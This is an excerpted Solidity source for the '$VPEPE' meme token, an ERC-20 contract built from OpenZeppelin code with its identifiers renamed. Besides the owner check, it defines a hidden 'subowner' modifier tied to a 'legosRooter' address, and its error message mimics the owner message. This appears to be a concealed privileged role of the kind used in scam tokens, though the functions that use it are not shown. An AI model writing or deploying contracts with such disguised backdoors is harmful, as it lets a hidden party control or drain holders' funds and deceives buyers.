...
/*
VIKING PEPE
$VPEPE is a meme VPEPE with no intrinsic value or expectation of financial return. 
There is no formal team or roadmap. the VPEPE is completely useless and for entertainment purposes only.
https://twitter.com/Viking_pepe
Vikingpepe
@Viking_pepe
*/
...
/*
 * @dev Provides information about the current execution VPEPE20Burnable, including the
 ...
 */
abstract contract VPEPE20Burnable {
...
// File: @openzeppelin/contracts/access/VPEPE20Ownable.sol
 ...
 * the owner.
 */
abstract contract VPEPE20Ownable is VPEPE20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "VPEPE20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "VPEPE20Ownable: new owner is the zero address");
 ...
 * `SafeVPEPE` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeVPEPE {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeVPEPE: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeVPEPE: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeVPEPE: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeVPEPE: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeVPEPE: modulo by zero");
  }
...
contract VPEPE is VPEPE20Burnable, VPEPE33, VPEPE20Ownable {
    
    using SafeVPEPE for uint256;
    ...
    */
    ...
    /**
    * @dev See {VPEPE33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "VPEPE20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {VPEPE33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {VPEPE33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {VPEPE33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "VPEPE33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {VPEPE33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "VPEPE33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "VPEPE33: transfer from the zero address");
        require(shippingto != address(0), "VPEPE33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "VPEPE33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "VPEPE33: approve from the zero address");
        require(transporteur != address(0), "VPEPE33: approve to the zero address");
